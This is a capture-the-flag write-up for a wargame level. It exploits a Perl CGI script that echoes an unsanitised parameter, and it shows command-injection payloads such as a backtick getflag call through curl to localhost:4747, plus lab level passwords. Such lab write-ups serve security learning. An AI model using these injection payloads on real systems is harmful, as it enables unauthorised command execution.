# Solve Level04
pass : qi0maab88jeaj46qoumi7maus

### Description
- perl script in level04 home, find the exact same file on /var/www/level04, ```diff``` on them return nothing
  - usually folder www makes sense for network things
- in home the file has special right (can we do the same has precedent level ?)
- in www the file has a + after the right file [he has differents access methods][df1] apache ?

#### The script
It uses CGI to execute echo command with the content of parameter 'x'
> Notice : program don't sanitize datas, we can put something like `level04.pl?x=pouet;/bin/bash`
Comment port 4747

#### Exploit the script
First, we need to focus on /home script and find a way to execute CGI
> we can pass params to script ```./scipt.pl param=lol``` [source][df3]
> `level04.pl x=pouet;/bin/bash` doesn't work, use `level04.pl x=pouet&&/bin/bash`

- the script has a comment localhost::4747 but the port is not open, can't access from outside
    - from inside ?
        - try ```top | grep flag04``` but nothing
        - need to find a way to listen local opened ports
            - ```man netstat``` ==> with option `-l` we can see listening ports ==> and taaadaaaa 4747 is here, we need to find a way to talk to localhost:4747 and use our precedents tests to exploit the script
            > from the end of the man netstat is obsolete and replace by `man ss`, ```ss -l```
        - don't have any local browser so try with ```man curl```
            - ```curl localhost:4747?x=\`getflag\` ```

## Solution
no flag
```curl localhost:4747?x=\`getflag\` ```

level05 : ne2searoevaevoem4ov4ar8ap

## Resolve problem
- never trust users, always sanitize your data


[df1]: https://stackoverflow.com/questions/30594871/what-does-the-dot-at-the-end-of-the-permissions-in-the-output-of-ls-lah-mean#:~:text=According%20to%20the%20Filesystem%20permissions,a%20SELinux%20context%20is%20present.
[df3]: https://metacpan.org/dist/CGI/view/lib/CGI.pod#DEBUGGING
